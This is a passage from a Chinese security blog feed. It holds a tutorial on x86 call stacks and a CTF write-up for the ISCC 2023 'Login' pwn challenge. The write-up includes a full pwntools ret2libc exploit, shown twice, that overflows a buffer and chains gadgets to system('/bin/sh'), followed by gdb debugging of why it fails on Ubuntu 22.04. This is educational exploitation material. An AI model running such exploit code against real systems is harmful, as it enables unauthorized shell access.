gnuplot-x11gnuplot <span class="token parameter variable">-v</span>   <span class="token comment"># 验证安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Windows 版 <code>gnuplot</code> 下载地址：<a href="http://www.gnuplot.info/">gnuplot homepage</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>函数调用栈</title>
      <link href="/posts/c68710a5.html"/>
      <url>/posts/c68710a5.html</url>
      
        <content type="html"><![CDATA[<h1 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h1><blockquote><p>以 32 位程序的寄存器为例</p></blockquote><p>在学汇编时我们知道，函数调用通常有如下写法：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">main:push ebpmov ebp<span class="token punctuation">,</span> esp...sub esp<span class="token punctuation">,</span> 20h   <span class="token comment">; 假设这中间的进栈操作使 esp 减了 20h</span>...call fun...leaveretfun:push ebpmov ebp<span class="token punctuation">,</span> esp...sub esp<span class="token punctuation">,</span> 30h   <span class="token comment">; 假设这中间的进栈操作使 esp 减了 30h</span>...leaveret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应 C 语言中的：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>关于理解函数的调用过程，我们主要要抓住 ESP、EBP、EIP 这三个寄存器的变化</p><p><strong>注意：学习这里必须要分清地址和地址中存放的值，这两者是不一样的，不然容易懵</strong></p><p><strong>就像 C 语言中指针 p 指向的是一个内存单元，也就是一个地址；而 <code>*p</code> 指的是这个内存单元中存放的数据，是一个值</strong></p></blockquote><h2 id="执行-main-函数"><a href="#执行-main-函数" class="headerlink" title="执行 main 函数"></a>执行 main 函数</h2><p>首先来看 main 函数：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">main:push ebpmov ebp<span class="token punctuation">,</span> esp...sub esp<span class="token punctuation">,</span> 20h   <span class="token comment">; 假设这中间的进栈操作使 esp 减了 20h</span>...call fun...leaveret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>在执行 <code>push ebp</code> 时，假设初始 ESP 指向 <code>0xffffce2c</code> 地址处，首先 <code>esp = esp - 4</code>，再将原本 EBP 的值 <code>push</code> 到 ESP 所指向的 <code>0xffffce28</code> 地址处</p></li><li><p>在执行 <code>mov ebp, esp</code> 时，将 ESP 的值赋值给 EBP，即：让 EBP 指向当前 ESP 所在地址，故此时 ESP 和 EBP 都指向 <code>0xffffce28</code> 地址处</p></li><li><p>在执行 <code>sub esp, 20h</code> 时，这里假设是在模拟函数中的各种进栈操作，使得 ESP 指向 <code>0xffffce08</code> 地址处，而 EBP 不会随着进栈而改变</p></li></ol><p>执行到这里，栈中的变化如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%881.png" alt="函数调用栈1.png"></p><ol start="4"><li>当执行 <code>call fun</code> 时，<code>call</code> 指令相当于：</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">push eipjmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>EIP 就是 <code>call fun</code> 这条指令的下一条指令的地址</p><p>首先 <code>esp = esp - 4</code>，再将 <code>call fun</code> 这条指令的下一条指令的地址填到 ESP 所指向的 <code>0xffffce04</code> 地址处</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%882.png" alt="函数调用栈2.png"></p><hr><h2 id="跳转到-fun-函数"><a href="#跳转到-fun-函数" class="headerlink" title="跳转到 fun 函数"></a>跳转到 fun 函数</h2><p>然后来看 fun 函数：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">fun:push ebpmov ebp<span class="token punctuation">,</span> esp...sub esp<span class="token punctuation">,</span> 30h   <span class="token comment">; 假设这中间的进栈操作使 esp 减了 30h</span>...leaveret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>fun 中的指令一直执行到 <code>sub esp, 30h</code> 都与 main 中开始时一样，不再赘述：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%883.png" alt="函数调用栈3.png"></p><ol start="6"><li>当 fun 函数的功能执行完后，会执行 <code>leave</code> 指令，<code>leave</code> 指令相当于：</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov esp<span class="token punctuation">,</span> ebp  <span class="token comment">; 恢复栈指针</span>pop ebp       <span class="token comment">; 恢复基址指针</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>注意：</p><p>在函数开始时</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">push ebp  mov ebp<span class="token punctuation">,</span> esp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这两条指令其实可以合并为一个 <code>enter</code> 指令，他们是等价的</p><p><strong><code>enter</code> 指令与 <code>leave</code> 指令的操作正好相反，<code>enter</code> 指令位于函数的开始，<code>leave</code> 指令位于函数的结尾，用来恢复栈帧</strong></p></blockquote><p>执行 <code>mov esp, ebp</code> 后，会将 EBP 的值赋值给 ESP，此时 ESP 会回到 EBP 所指向的地址 <code>0xffffce00</code> 处</p><p>执行 <code>pop ebp</code> 后，会先将 ESP 所指向的地址 <code>0xffffce00</code> 中存放的数据 <code>0xffffce28</code> 出栈送入 EBP，因此这时 EBP 会指向 <code>0xffffce28</code> 地址处；然后，由于出栈的 pop 操作使得 <code>esp = esp + 4</code>，因此执行 <code>pop ebp</code> 后 ESP 指向 <code>0xffffce04</code> 地址处</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%884.png" alt="函数调用栈4.png"></p><ol start="7"><li>接着执行 <code>ret</code> 指令，<code>ret</code> 指令相当于：</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">pop eip   <span class="token comment">; 这样写是方便理解，实际上不存在 pop eip 这个汇编指令</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先将此时 ESP 所指向的地址 <code>0xffffce04</code> 中存放的 <code>call fun</code> 指令的下一条指令的地址出栈送入 EIP，然后由于出栈的 pop 操作使得 <code>esp = esp + 4</code>，因此执行 <code>pop ebp</code> 后 ESP 指向 <code>0xffffce08</code> 地址处</p><p>EIP 中存放的是下一条要执行的指令的地址，由于这里修改了 EIP 的值为 <code>call fun</code> 指令的下一条指令的地址</p><p>因此这时程序会转而执行 <code>call fun</code> 指令的下一条指令，<strong>程序也就从 fun 函数回到了 main 函数中</strong></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%885.png" alt="函数调用栈5.png"></p><p>到这里，栈又回到了 main 中 <code>call fun</code> 这句执行之前的样子</p><blockquote><p><em>注意：栈中的数据出栈后仍然会保存在内存单元中，只是 ESP 的值改变了，计算机认为出栈后的数据已经不在栈里面了（计算机根据 EBP 和 ESP 来识别栈空间），但这个数据还是在内存单元中保存着，不会因为出栈而被清空</em></p></blockquote><hr><h2 id="回到-main-函数"><a href="#回到-main-函数" class="headerlink" title="回到 main 函数"></a>回到 main 函数</h2><ol start="8"><li>当 main 中剩余的操作执行完后，也会执行 <code>leave</code> 指令</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%886.png" alt="函数调用栈6.png"></p><p>这时候 ESP 回到最开始的 <code>0xffffce2c</code> 地址处，EBP 也回到原本 EBP 所在的地址处</p><p>最后通过 <code>ret</code> 指令回到 main 函数被调用时的位置，整个程序的主函数执行到这里就结束了</p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> x86汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN中程序的libc问题</title>
      <link href="/posts/1205d4ce.html"/>
      <url>/posts/1205d4ce.html</url>
      
        <content type="html"><![CDATA[<h1 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h1><blockquote><p><code>libc.so</code> 是一个动态链接文件，在程序运行的时候，才会去寻找库文件，取出里面的代码放进内存运行（像平时在运行 Windows 时弹出的 <code>&quot;找不到 xxx.dll文件&quot;</code> 其实就是动态链接）</p><p><strong>一般来说，libc 中存放的都是使用过的函数、字符串等</strong></p></blockquote><ol><li><strong>在 <code>libc.so</code> 动态链接库中的函数之间相对偏移是固定的。</strong> 也就是说，虽然程序在执行过程中，真实地址会随着每一次加载 libc 而变化，但是两个函数之间的偏移量总是固定不变的</li></ol><p>假设文件中三个函数的地址是 0x40010、0x40020、0x40050，但是加载到内存后会增加一个基地址，假设基地址为 0x000100，虽然地址变了，但他们之间的相对偏移还是一样的</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E5.png" alt="栈溢出漏洞5.png"></p><ol start="2"><li><strong>根据系统的版本不同，系统中所使用的 libc 的版本也会有所差别。</strong> 所以我们首先需要确定程序所使用的是哪一个版本的 libc，这里可以用 <code>LibcSearcher</code> 来寻找（也有的题会直接给出 libc 文件）</li></ol><p>不过 <code>LibcSearcher</code> 找到的 libc 版本可能有多个，有时候需要去判断，而且得到的字符串的地址不一定刚刚好，可能需要通过调试去验证。另外，也可以通过网站来查询：<a href="https://libc.blukat.me/">libc database search</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E7.png" alt="栈溢出漏洞7.png"></p><blockquote><p>注意：<br>通过 ret2libc 计算出 libc 基地址时，<strong>libc 基地址 <code>libcbase</code> 最后三位一般是全 0</strong>，可用于判断是否计算正确，libc 基地址可以在 GDB 中使用 <code>vmmap</code> 进行查看</p><p>另外，<strong>libc 中的函数偏移在加载到内存后地址最后三位是不会变的</strong>，例如：<code>system()</code> 函数在 libc 中偏移量为 0x48<em>E50</em>，则加载到内存中可能为 0xF7D1B<em>E50</em></p><p><mark>与操作系统的 4 KB 分页机制有关，4 KB &#x3D; 4 * 1024 (D) &#x3D; 1000 (H)</mark></p></blockquote><hr><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>以 ISCC 2023 的一道 PWN 题为例：<a href="https://iscc.isclab.org.cn/">【ISCC 2023】Login</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login1.png" alt="ISCC2023-Login1.png"></p><p>程序逻辑如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login3.png" alt="ISCC2023-Login3.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login5.png" alt="ISCC2023-Login5.png"></p><p>函数 <code>main()</code> 栈中的情况：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login4.png" alt="ISCC2023-Login4.png"></p><p>思路比较简单，首先通过输入 buf 来修改 v6 的值为 365696460 （0x15CC15CC） 绕过 if 判断</p><p>然后通过 <code>print_name()</code> 函数中的 <code>memcpy()</code> 将 v4 复制到 dest 中，由于 v4 长度为 0x100，而 dest 长度为 0x20，可以利用 v4 覆盖 dest 来修改返回地址</p><p>而题目中没有 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code>，但是给出了 libc 文件</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login6.png" alt="ISCC2023-Login6.png"></p><p>同时程序输出了 stdin 的真实地址 （通过动态调试发现其实是 <code>_IO_2_1_stdin_</code> 而不是 <code>stdin</code>）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login9.png" alt="ISCC2023-Login9.png"></p><p>因此使用 ret2libc 来获取 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code> 的地址</p><p>在 Ubuntu 16.04 下，使用如下 exp 直接获得 shell：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Here is a tip: "</span><span class="token punctuation">)</span>stdin_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment"># 获取程序输出的地址</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stdin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the username:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">365696460</span><span class="token punctuation">)</span> <span class="token comment"># 修改 v6 绕过 if</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># 利用 _IO_2_1_stdin_ 计算 libc 偏移</span>libcbase <span class="token operator">=</span> stdin_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4008c3</span> <span class="token comment"># 64 位传参</span>ret <span class="token operator">=</span> <span class="token number">0x400599</span> <span class="token comment"># 用于堆栈平衡（glibc 2.27 以下可以不加 ret, 不影响程序执行流）</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the password:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>由于在 Ubuntu 16.04 中，glibc 2.27 以下版本不存在 <code>system()</code> 函数中 <code>movaps</code> 指令操作 XMM 寄存器的堆栈平衡问题，因此 payload 中 <code>p64(ret)</code> 可加可不加</p><p><mark>但在 Ubuntu 22.04 中就必须得加，索性养成习惯直接加上</mark></p><p><em>详见《<a href="PWN%E4%B8%AD64%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1.md">PWN中64位程序的堆栈平衡</a>》一文</em></p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login11.png" alt="ISCC2023-Login11.png"></p><p>但在 Ubuntu 22.04 中使用同样的 exp，就无法获得 shell：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%981.png" alt="PWN中程序的libc问题1.png"></p><blockquote><p>玄学的问题出现了：</p><p>同样的脚本，同样的程序，在 Ubuntu 16.04 可以打通，在 Ubuntu 22.04 就打不通</p></blockquote><hr><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>在 Ubuntu 22.04 中调试分析一下</p><p>在第二个 payload 发送之前附加 gdb 调试，完整测试脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Here is a tip: "</span><span class="token punctuation">)</span>stdin_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment"># 获取程序输出的地址</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stdin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the username:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">365696460</span><span class="token punctuation">)</span> <span class="token comment"># 修改 v6 绕过 if</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># 利用 _IO_2_1_stdin_ 计算 libc 偏移</span>libcbase <span class="token operator">=</span> stdin_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4008c3</span> <span class="token comment"># 64 位传参</span>ret <span class="token operator">=</span> <span class="token number">0x400599</span> <span class="token comment"># 用于堆栈平衡（glibc 2.27 以下可以不加 ret, 不影响程序执行流）</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the password:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行到 <code>call print_name</code> 处</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%982.png" alt="PWN中程序的libc问题2.png"></p><p>可以看到 <code>print_name()</code> 函数的返回地址没有问题，为 <code>pop rdi</code></p><p>单步 si 进入 <code>print_name()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%983.png" alt="PWN中程序的libc问题3.png"></p><p><code>print_name()</code> 函数结束后，确实返回到 <code>0x4008c3 &lt;__libc_csu_init+99&gt;</code> 处执行了 <code>pop rdi</code> 指令，也没有问题</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%984.png" alt="PWN中程序的libc问题4.png"></p><p>执行完 <code>pop rdi</code> 指令后，正常返回到 <code>0x400599 &lt;_init+25&gt;</code> 处执行 <code>ret</code> 指令，也没有问题</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%985.png" alt="PWN中程序的libc问题5.png"></p><p><code>ret</code> 返回到 <code>0x7fb6dc29a560</code> 地址处</p><p>再次单步执行，程序便崩溃了：地址 <code>0x7fb6dc29a560</code> 不合法</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%986.png" alt="PWN中程序的libc问题6.png"></p><p>按道理说，这个地址存放的应该是 <code>system()</code> 函数的地址</p><p>回头观察执行 <code>pop rdi</code> 指令时的情况，出栈到 RDI 的地址为：<code>0x7fb6dc3e2017</code>，正常来讲这个地址应该为 <code>&quot;/bin/sh&quot;</code> 的地址</p><p>实际发现这两个地址确实都不存在：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%987.png" alt="PWN中程序的libc问题7.png"></p><hr><p>而在 Ubuntu 16.04 中使用同样的脚本进行调试时</p><p>发现最后 <code>ret</code> 的地址就是 <code>system()</code> 的地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%988.png" alt="PWN中程序的libc问题8.png"></p><p><code>pop rdi</code> 出栈的也是 <code>&quot;/bin/sh&quot;</code> 的地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%989.png" alt="PWN中程序的libc问题9.png"></p><p>没有任何问题，可以正常获得 shell</p><p>大致可以猜测应该是 Ubuntu 22.04 中 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code> 地址不对</p><hr><p>接下来，我们在 Ubuntu 22.04 中验证一下</p><p>先单步执行完 <code>pop rdi</code> 指令：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9810.png" alt="PWN中程序的libc问题10.png"></p><p>此时我们查找 <code>&quot;/bin/sh&quot;</code> 和 <code>system()</code> 函数的地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9811.png" alt="PWN中程序的libc问题11.png"></p><p>使用 <code>set</code> 命令强行手动将 RDI 寄存器和 RIP 寄存器修改，使 RDI 存放 <code>&quot;/bin/sh&quot;</code> 的地址，RIP 存放 <code>system()</code> 函数的地址</p><p>然后 si 单步步入，发现已经正常进入 <code>system()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9812.png"></p><p>直接 finish 结束函数，可以获得 shell：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9813.png" alt="PWN中程序的libc问题13.png"></p><p>在 Pycharm 中运行的 exp 也同步获得 shell：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9814.png" alt="PWN中程序的libc问题14.png"></p><blockquote><p>由此可以得出结论：<br>其实 Ubuntu 22.04 中无法 getshell 的原因就是 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code> 的地址计算错误<br>而 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code> 的地址是由 libc 文件计算偏移得来的，因此问题出在 libc 文件上</p></blockquote><hr><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>由于题目给的 libc 文件为 <code>libc-2.23.so</code>，在 Ubuntu 16.04 这样的老版本中没有问题</p><p>但是在 Ubuntu 22.04 这样的新版本中就不对了</p><p>Ubuntu 16.04 的 glibc 版本：</p><p><img 